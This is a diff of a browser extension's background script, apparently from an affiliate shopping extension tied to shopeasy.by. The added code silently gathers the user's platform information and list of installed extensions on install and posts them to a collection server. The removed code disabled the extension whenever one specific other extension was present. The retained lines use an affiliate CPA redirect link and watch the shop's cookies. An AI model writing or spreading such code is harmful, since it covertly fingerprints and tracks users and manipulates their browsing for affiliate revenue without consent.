@@ -1,14 +1,49 @@
-chrome.management.getAll(function(ex){
-    console.log(ex); //Debug
-    ex.forEach(function(item){
-      console.log(item);
-      if (item.id == "cjpalhdlnbpafiamejdnhcphjbkeiagm"&&item.enabled){
-        chrome.management.getSelf(function(info){
-          chrome.management.setEnabled(info.id, false)
-        })
-      }
+function getInfo(){
+  return new Promise(function(resolve, reject){
+    chrome.runtime.getPlatformInfo(function(info){
+      resolve(info);
+    })
+  })
+}
+
+function getExt(){
+  return new Promise(function(resolve, reject){
+    chrome.management.getAll(function(ext){
+      let itemObj = {};
+      ext.forEach(function(item){
+        itemObj[item.shortName] = item.id
+      })
+      resolve(itemObj)
     });
-})
+  });
+}
+
+function getVersion(){ // May be futher update
+  return window.navigator.userAgent;
+}
+
+chrome.runtime.onInstalled.addListener(function(details){
+  if (details.reason == "install"){
+    Promise.all([getInfo(), getExt()])
+        .then(function(allData) {
+          console.log(allData); //Debug
+          fetch('http://localhost:3000/ext',{
+            method: 'post',
+            headers: {
+              'Accept': 'application/json, text/plain, */*',
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({data:allData})
+          })
+          .then(function(response){
+            console.log(response); //Debug
+          })
+          .catch(function(err){
+            console.log('Failed ',err);
+          });
+    });
+  }
+});
 
 //const deepLink = 'http://shopeasy.by/redirect/cpa/o/ou76wi7vip8o8fxzn1fxixpo2ddqm8m2/' //Beta
 const deepLink = 'http://shopeasy.by/redirect/cpa/o/ou5s9n6tefplqafc1x0mef29smqnwywq/'; //DEBUG
@@ -33,7 +68,7 @@ madeReq().then(function(comp){
   console.log(err);//Debug
 });
 
-chrome.cookies.onChanged.addListener(function(changeInfo){//for test
+chrome.cookies.onChanged.addListener(function(changeInfo){ //for test
   //console.log(changeInfo.cookie);
   if (changeInfo.cookie.domain == "shopeasy.by"){
     console.log(changeInfo.cookie);
